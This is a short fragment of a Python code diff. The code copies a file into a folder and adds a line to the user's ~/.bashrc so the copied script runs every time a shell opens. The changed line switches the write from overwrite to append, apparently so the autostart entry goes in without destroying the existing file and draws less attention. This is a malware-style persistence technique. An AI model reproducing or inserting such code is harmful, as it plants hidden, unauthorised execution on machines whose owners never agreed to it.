@@ -12,7 +12,7 @@ def run(name):
             print(filename)
             os.makedirs(fldrpath, exist_ok=True)
             shutil.copy(name, os.path.join(fldrpath, os.path.basename(name)))
-            with open(f'/home/{user}/.bashrc', 'w') as fl:
+            with open(f'/home/{user}/.bashrc', 'a') as fl:
                 fl.write(f'python {fldrpath}{filename}')
         move()
 
